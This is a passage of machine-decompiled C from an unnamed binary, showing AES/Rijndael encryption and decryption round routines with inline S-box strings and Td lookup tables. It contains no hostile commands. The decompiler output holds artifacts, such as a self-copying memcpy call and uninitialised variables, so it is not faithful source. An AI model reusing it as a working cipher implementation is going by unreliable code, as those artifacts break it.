            *(int32_t *)(v23 - 12) = v27;
            memcpy(&g54, &g54, (int32_t)&g54);
            v29++;
            v48 = *v19;
            v30 += 32;
            v21 = v48;
            result = v29;
        }
    }
    // 0x4036c7
    if (v5 < 1) {
        // 0x403790
        return result;
    }
    int32_t v49 = v1 + 1108; // 0x4036d9
    int64_t v50 = v4 & 0xffffffff; // 0x403728
    int32_t v51 = v1 + 1110; // 0x40372c
    int32_t v52 = v1 + 1109; // 0x40374b
    int32_t v53 = v49; // 0x4036ef
    int32_t v54 = 0; // 0x4036ef
    int32_t v55 = a2; // 0x4036ef
    int32_t v56 = v8;
    uint32_t v57 = *(int32_t *)(v1 + 8 + 4 * (v54 + 8 * v21)); // 0x403705
    unsigned char v58 = *(char *)(v53 + 3); // 0x40370e
    char v59 = *(char *)((int32_t)v58 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403717
    *(char *)v55 = v59 ^ (char)(v57 / 0x1000000);
    int32_t v60 = v56 + v7 - v8; // 0x403724
    unsigned char v61 = *(char *)(v51 + 4 * (int32_t)((0x100000000 * (int64_t)(v60 >> 31) | (int64_t)v60) % v50)); // 0x40372c
    char v62 = *(char *)((int32_t)v61 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403739
    *(char *)(v55 + 1) = v62 ^ (char)(v57 / 0x10000);
    unsigned char v63 = *(char *)(v52 + 4 * (int32_t)((0x100000000 * (int64_t)(v56 >> 31) | (int64_t)v56) % v50)); // 0x40374b
    char v64 = *(char *)((int32_t)v63 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403758
    *(char *)(v55 + 2) = v64 ^ (char)(v57 / 256);
    int32_t v65 = v56 + v9 - v8; // 0x403765
    int32_t v66 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v65 >> 31) | (int64_t)v65) % v50) + v49); // 0x40376b
    char v67 = *(char *)((v66 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403777
    unsigned char result2 = v67 ^ (char)v57; // 0x40377d
    *(char *)(v55 + 3) = result2;
    v54++;
    while (v54 != v5) {
        // 0x4036f2
        v53 += 4;
        v55 += 4;
        v56++;
        v57 = *(int32_t *)(v1 + 8 + 4 * (v54 + 8 * *v19));
        v58 = *(char *)(v53 + 3);
        v59 = *(char *)((int32_t)v58 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        *(char *)v55 = v59 ^ (char)(v57 / 0x1000000);
        v60 = v56 + v7 - v8;
        v61 = *(char *)(v51 + 4 * (int32_t)((0x100000000 * (int64_t)(v60 >> 31) | (int64_t)v60) % v50));
        v62 = *(char *)((int32_t)v61 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        *(char *)(v55 + 1) = v62 ^ (char)(v57 / 0x10000);
        v63 = *(char *)(v52 + 4 * (int32_t)((0x100000000 * (int64_t)(v56 >> 31) | (int64_t)v56) % v50));
        v64 = *(char *)((int32_t)v63 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        *(char *)(v55 + 2) = v64 ^ (char)(v57 / 256);
        v65 = v56 + v9 - v8;
        v66 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v65 >> 31) | (int64_t)v65) % v50) + v49);
        v67 = *(char *)((v66 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        result2 = v67 ^ (char)v57;
        *(char *)(v55 + 3) = result2;
        v54++;
    }
    // 0x403790
    return result2;
}

// Address range: 0x403797 - 0x403a28
// Used cryptographic patterns:
//  - AES_Rijndael_Si___ARIA_X1 (8-bit)
//  - Rijndael_Td0__0x51f4a750U_ (32-bit, little endian)
//  - Rijndael_Td1__0x5051f4a7U_ (32-bit, little endian)
//  - Rijndael_Td2__0xa75051f4U_ (32-bit, little endian)
//  - Rijndael_Td3__0xf4a75051U_ (32-bit, little endian)
int32_t function_403797(int32_t a1, int32_t a2) {
    // 0x403797
    int32_t v1; // 0x403797
    if (*(char *)(v1 + 4) == 0) {
        // 0x4037a8
        int32_t v2; // bp-56, 0x403797
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v2);
        _CxxThrowException(&v2, &g17);
        // UNREACHABLE
    }
    uint32_t v3 = *(int32_t *)(v1 + 972); // 0x4037c4
    if (v3 == 16) {
        // 0x403a21
        return function_4031bc(a1, a2);
    }
    int64_t v4 = (0x100000000 * (int64_t)(v3 / 0x80000000) | (int64_t)v3) / 4; // 0x4037e5
    int32_t v5 = v4; // 0x4037e5
    int32_t v6 = v5 == 4 ? 0 : v5 != 6 ? 64 : 32; // 0x4037f8
    int32_t v7 = *(int32_t *)(v6 + (int32_t)&g9); // 0x4037ff
    int32_t v8 = *(int32_t *)(v6 + (int32_t)&g11); // 0x403808
    int32_t v9 = *(int32_t *)(v6 + (int32_t)&g13); // 0x40380e
    if (v5 >= 1) {
        int32_t v10 = v5; // 0x40382e
        int32_t v11 = v1 + 488; // 0x40382e
        int32_t v12 = v1 + 1108; // 0x40382e
        int32_t v13 = a1; // 0x40382e
        int32_t v14 = 0x1000000 * (int32_t)*(char *)v13; // 0x403834
        int32_t * v15 = (int32_t *)v12; // 0x403838
        *v15 = v14;
        int32_t v16 = 0x10000 * (int32_t)*(char *)(v13 + 1) | v14; // 0x403840
        *v15 = v16;
        int32_t v17 = 256 * (int32_t)*(char *)(v13 + 2) | v16; // 0x403847
        *v15 = v17;
        int32_t v18 = v17 | (int32_t)*(char *)(v13 + 3); // 0x40384f
        *v15 = v18;
        *v15 = v18 ^ *(int32_t *)v11;
        v10--;
        v11 += 4;
        v12 += 4;
        v13 += 4;
        while (v10 != 0) {
            // 0x403831
            v14 = 0x1000000 * (int32_t)*(char *)v13;
            v15 = (int32_t *)v12;
            *v15 = v14;
            v16 = 0x10000 * (int32_t)*(char *)(v13 + 1) | v14;
            *v15 = v16;
            v17 = 256 * (int32_t)*(char *)(v13 + 2) | v16;
            *v15 = v17;
            v18 = v17 | (int32_t)*(char *)(v13 + 3);
            *v15 = v18;
            *v15 = v18 ^ *(int32_t *)v11;
            v10--;
            v11 += 4;
            v12 += 4;
            v13 += 4;
        }
    }
    int32_t * v19 = (int32_t *)(v1 + 1040); // 0x403868
    uint32_t v20 = *v19; // 0x403868
    int32_t v21 = v20; // 0x403871
    int32_t result = 1; // 0x403871
    if (v20 >= 2) {
        // 0x403877
        int32_t v22; // bp-68, 0x403797
        int32_t v23 = &v22; // 0x403867
        int32_t v24 = v1 + 1076;
        int64_t v25 = v4 & 0xffffffff;
        int32_t v26 = v1 + 1109;
        int32_t v27 = v1 + 1108;
        int32_t v28 = v1 + 1110;
        int32_t v29 = 1; // 0x40387d
        int32_t v30 = v1 + 520; // 0x40387d
        int32_t v31 = v30; // 0x403882
        int32_t v32 = v24; // 0x403882
        int32_t v33; // 0x403797
        int32_t v34; // 0x403797
        int32_t v35; // 0x403797
        int32_t v36; // 0x4038b3
        unsigned char v37; // 0x4038bc
        int32_t v38; // 0x4038c6
        int32_t v39; // 0x4038ce
        int32_t v40; // 0x4038dd
        int32_t v41; // 0x4038e4
        unsigned char v42; // 0x4038f3
        int32_t v43; // 0x4038fa
        unsigned char v44; // 0x403903
        int32_t v45; // 0x403906
        int32_t v46; // 0x403914
        int32_t v47; // 0x40391e
        if (v5 >= 1) {
            v34 = v7;
            v36 = v34 + v8 - v7;
            v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
            v38 = v34 + v9 - v7;
            v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
            v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc);
            v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
            v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
            v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc);
            v44 = *(char *)(v32 + 35);
            v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc);
            v46 = *(int32_t *)v31;
            *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
            v47 = v5 - 1;
            v33 = v34 + 1;
            v31 += 4;
            v35 = v47;
            v32 += 4;
            while (v47 != 0) {
                // 0x4038ad
                v34 = v33;
                v36 = v34 + v8 - v7;
                v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                v38 = v34 + v9 - v7;
                v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc);
                v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
                v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc);
                v44 = *(char *)(v32 + 35);
                v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc);
                v46 = *(int32_t *)v31;
                *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                v47 = v35 - 1;
                v33 = v34 + 1;
                v31 += 4;
                v35 = v47;
                v32 += 4;
            }
        }
        // 0x403923
        *(int32_t *)(v23 - 4) = 4 * v5;
        *(int32_t *)(v23 - 8) = v24;
        *(int32_t *)(v23 - 12) = v27;
        memcpy(&g54, &g54, (int32_t)&g54);
        v29++;
        uint32_t v48 = *v19; // 0x403949
        v30 += 32;
        v21 = v48;
        result = v29;
        while (v29 < v48) {
            // 0x403880
            v31 = v30;
            v32 = v24;
            if (v5 >= 1) {
                v34 = v7;
                v36 = v34 + v8 - v7;
                v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                v38 = v34 + v9 - v7;
                v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc);
                v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
                v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc);
                v44 = *(char *)(v32 + 35);
                v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc);
                v46 = *(int32_t *)v31;
                *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                v47 = v5 - 1;
                v33 = v34 + 1;
                v31 += 4;
                v35 = v47;
                v32 += 4;
                while (v47 != 0) {
                    // 0x4038ad
                    v34 = v33;
                    v36 = v34 + v8 - v7;
                    v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                    v38 = v34 + v9 - v7;
                    v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                    v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc);
                    v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
                    v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                    v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc);
                    v44 = *(char *)(v32 + 35);
                    v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc);
                    v46 = *(int32_t *)v31;
                    *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                    v47 = v35 - 1;
                    v33 = v34 + 1;
                    v31 += 4;
                    v35 = v47;
                    v32 += 4;
                }
            }
            // 0x403923
            *(int32_t *)(v23 - 4) = 4 * v5;
            *(int32_t *)(v23 - 8) = v24;
            *(int32_t *)(v23 - 12) = v27;
            memcpy(&g54, &g54, (int32_t)&g54);
            v29++;
            v48 = *v19;
            v30 += 32;
            v21 = v48;
            result = v29;
        }
    }
    // 0x403955
    if (v5 < 1) {
        // 0x403a21
        return result;
    }
    int32_t v49 = v1 + 1108; // 0x403967
    int64_t v50 = v4 & 0xffffffff; // 0x4039b9
    int32_t v51 = v1 + 1110; // 0x4039bd
    int32_t v52 = v1 + 1109; // 0x4039dc
    int32_t v53 = v49; // 0x40397d
    int32_t v54 = 0; // 0x40397d
    int32_t v55 = a2; // 0x40397d
    int32_t v56 = v8;
    uint32_t v57 = *(int32_t *)(v1 + 488 + 4 * (v54 + 8 * v21)); // 0x403993
    unsigned char v58 = *(char *)(v53 + 3); // 0x40399f
    char v59 = *(char *)((int32_t)v58 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4039a8
    *(char *)v55 = v59 ^ (char)(v57 / 0x1000000);
    int32_t v60 = v56 + v7 - v8; // 0x4039b5
    unsigned char v61 = *(char *)(v51 + 4 * (int32_t)((0x100000000 * (int64_t)(v60 >> 31) | (int64_t)v60) % v50)); // 0x4039bd
    char v62 = *(char *)((int32_t)v61 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4039ca
    *(char *)(v55 + 1) = v62 ^ (char)(v57 / 0x10000);
    unsigned char v63 = *(char *)(v52 + 4 * (int32_t)((0x100000000 * (int64_t)(v56 >> 31) | (int64_t)v56) % v50)); // 0x4039dc
    char v64 = *(char *)((int32_t)v63 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4039e9
    *(char *)(v55 + 2) = v64 ^ (char)(v57 / 256);
    int32_t v65 = v56 + v9 - v8; // 0x4039f6
